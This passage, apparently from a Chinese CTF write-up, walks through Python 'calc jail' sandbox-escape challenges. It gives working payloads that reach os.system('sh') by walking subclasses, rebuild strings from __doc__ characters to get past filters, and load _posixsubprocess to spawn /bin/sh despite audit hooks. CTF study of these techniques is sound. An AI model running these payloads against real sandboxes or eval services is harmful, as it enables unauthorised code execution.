<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
</span></span></code></pre></td></tr></table>
</div>
</div><p>#转换为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 1
</span></span><span class="line"><span class="cl">15, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level42" class="headerLink">
    <a href="#calc_jail_beginner_level42" class="header-mark"></a>calc_jail_beginner_level4.2</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  _                _                           _       _ _   _                _ _  _   ___
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | | |              | | || | |__ \
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                                                                                                                                                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to the python jail
</span></span><span class="line"><span class="cl">Let&#39;s have an beginner jail of calc
</span></span><span class="line"><span class="cl">Enter your expression and I will evaluate it for you.
</span></span><span class="line"><span class="cl">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&#34;,&#39;,+ Good luck!
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Show subclasses with tuple：</p>
<p>索引byte的方法仍然可以用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">6</span><span class="p">]([</span><span class="mi">115</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()](()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">6</span><span class="p">]([</span><span class="mi">115</span><span class="p">,</span> <span class="mi">104</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>题目将<code>+</code>也ban了，<code>__doc__</code>魔法函数的方法无法直接用</p>
<p>可以改变字符串的拼接方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level43" class="headerLink">
    <a href="#calc_jail_beginner_level43" class="header-mark"></a>calc_jail_beginner_level4.3</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">  <span class="n">_</span>                <span class="n">_</span>                           <span class="n">_</span>       <span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>                <span class="n">_</span> <span class="n">_</span>  <span class="n">_</span>   <span class="n">____</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span>              <span class="p">(</span><span class="n">_</span><span class="p">)</span>                         <span class="p">(</span><span class="n">_</span><span class="p">)</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>              <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span> <span class="o">|</span><span class="n">___</span> \
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span>  <span class="n">_</span> <span class="n">__</span>   <span class="n">___</span> <span class="n">_</span> <span class="n">__</span>     <span class="n">_</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="n">_____</span>   <span class="n">_____</span><span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span><span class="n">_</span>  <span class="n">__</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="s1">&#39;_ \ / _ \/ _` | | &#39;</span><span class="n">_</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span><span class="n">__</span><span class="o">|</span>   <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span> \ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \ <span class="o">|</span><span class="n">__</span>   <span class="n">_</span><span class="o">||</span><span class="n">__</span> <span class="o">&lt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>      <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span>\ <span class="n">V</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">___</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>      <span class="o">|</span> <span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span> \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="n">____</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">              <span class="n">__</span><span class="o">/</span> <span class="o">|</span>                          <span class="n">_</span><span class="o">/</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">             <span class="o">|</span><span class="n">___</span><span class="o">/</span>                          <span class="o">|</span><span class="n">__</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">                                                                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">python</span> <span class="n">jail</span>
</span></span><span class="line"><span class="cl"><span class="n">Let</span><span class="s1">&#39;s have an beginner jail of calc</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">your</span> <span class="n">expression</span> <span class="ow">and</span> <span class="n">I</span> <span class="n">will</span> <span class="n">evaluate</span> <span class="n">it</span> <span class="k">for</span> <span class="n">you</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Banned</span> <span class="n">__loader__</span><span class="p">,</span><span class="n">__import__</span><span class="p">,</span><span class="n">compile</span><span class="p">,</span><span class="n">eval</span><span class="p">,</span><span class="n">exec</span><span class="p">,</span><span class="n">chr</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="n">locals</span><span class="p">,</span><span class="n">globals</span><span class="p">,</span><span class="n">bytes</span><span class="p">,</span><span class="n">open</span><span class="p">,</span><span class="n">type</span> <span class="ow">and</span> <span class="err">`</span><span class="p">,</span><span class="s2">&#34;,&#39;,+ Good luck!</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>calc_jail_beginner_level4.2的payload仍然可以用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">6</span><span class="p">]([</span><span class="mi">115</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()](()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">6</span><span class="p">]([</span><span class="mi">115</span><span class="p">,</span> <span class="mi">104</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="nb">str</span><span class="p">()</span><span class="o">.</span><span class="n">join</span><span class="p">([()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">86</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">4</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">17</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">10</span><span class="p">]])](</span><span class="nb">str</span><span class="p">()</span><span class="o">.</span><span class="n">join</span><span class="p">([()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">],()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">56</span><span class="p">]]))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level5" class="headerLink">
    <a href="#calc_jail_beginner_level5" class="header-mark"></a>calc_jail_beginner_level5</h3><p>没有附件，只有回显</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  _                _                           _       _ _ _                _ _____
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | |              | | ____|
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">It&#39;s so easy challenge!
</span></span><span class="line"><span class="cl">Seems flag into the dir()
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>按题目hint输入<code>dir()</code>得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nb">dir</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;my_flag&#39;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>随后尝试一句话RCE</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt; __import__(&#39;os&#39;).system(&#39;sh&#39;)
</span></span><span class="line"><span class="cl">sh: 0: can&#39;t access tty; job control turned off
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level51" class="headerLink">
    <a href="#calc_jail_beginner_level51" class="header-mark"></a>calc_jail_beginner_level5.1</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  _                _                           _       _ _ _                _ _____ __
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | |              | | ____/_ |
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  | |
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \ | |
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) || |
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)_|
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">It&#39;s so easy challenge!
</span></span><span class="line"><span class="cl">Seems flag into the dir()
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>尝试<code>dir()</code>，随后一句话RCE，发现<code>__import__</code>可能被删了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt; __import__(&#39;os&#39;).system(&#39;sh&#39;)
</span></span><span class="line"><span class="cl">Traceback (most recent call last):
</span></span><span class="line"><span class="cl">  File &#34;/home/ctf/./server.py&#34;, line 42, in &lt;module&gt;
</span></span><span class="line"><span class="cl">  File &#34;/home/ctf/./server.py&#34;, line 31, in main
</span></span><span class="line"><span class="cl">  File &#34;/home/ctf/./server.py&#34;, line 39, in repl
</span></span><span class="line"><span class="cl">  File &#34;&lt;string&gt;&#34;, line 1, in &lt;module&gt;
</span></span><span class="line"><span class="cl">NameError: name &#39;__import__&#39; is not defined
</span></span></code></pre></td></tr></table>
</div>
</div><p>尝试Show subclasses with tuple</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1">#发现&lt;class &#39;os._wrap_close&#39;&gt;在倒数第6位</span>
</span></span><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">](</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level6" class="headerLink">
    <a href="#calc_jail_beginner_level6" class="header-mark"></a>calc_jail_beginner_level6</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  _                _                           _       _ _   _                _   __
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | | |              | | / /
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &#39;_ \
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to the python jail
</span></span><span class="line"><span class="cl">Let&#39;s have an beginner jail of calc
</span></span><span class="line"><span class="cl">Enter your expression and I will evaluate it for you.
</span></span><span class="line"><span class="cl">White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile
</span></span><span class="line"><span class="cl">Some code of python jail:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  dict_global = dict()
</span></span><span class="line"><span class="cl">    while True:
</span></span><span class="line"><span class="cl">      try:
</span></span><span class="line"><span class="cl">          input_data = input(&#34;&gt; &#34;)
</span></span><span class="line"><span class="cl">      except EOFError:
</span></span><span class="line"><span class="cl">          print()
</span></span><span class="line"><span class="cl">          break
</span></span><span class="line"><span class="cl">      except KeyboardInterrupt:
</span></span><span class="line"><span class="cl">          print(&#39;bye~~&#39;)
</span></span><span class="line"><span class="cl">          continue
</span></span><span class="line"><span class="cl">      if input_data == &#39;&#39;:
</span></span><span class="line"><span class="cl">          continue
</span></span><span class="line"><span class="cl">      try:
</span></span><span class="line"><span class="cl">          complie_code = compile(input_data, &#39;&lt;string&gt;&#39;, &#39;single&#39;)
</span></span><span class="line"><span class="cl">      except SyntaxError as err:
</span></span><span class="line"><span class="cl">          print(err)
</span></span><span class="line"><span class="cl">          continue
</span></span><span class="line"><span class="cl">      try:
</span></span><span class="line"><span class="cl">          exec(complie_code, dict_global)
</span></span><span class="line"><span class="cl">      except Exception as err:
</span></span><span class="line"><span class="cl">          print(err)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>几乎把所有的hook给ban了</p>
<p>参考https://ctftime.org/writeup/31883</p>
<p>利用<code>_posixsubprocess.fork_exec</code>来RCE</p>
<p>但如果我们直接<code>import _posixsubprocess</code>，会触发audit hook：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Operation not permitted: import
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以通过如下方法绕过：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__loader__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为是多次<code>exec</code>，所以我们可以输入多行代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl"><span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="n">True</span><span class="p">,</span> <span class="p">(),</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="n">False</span><span class="p">,</span> <span class="n">False</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">None</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level61" class="headerLink">
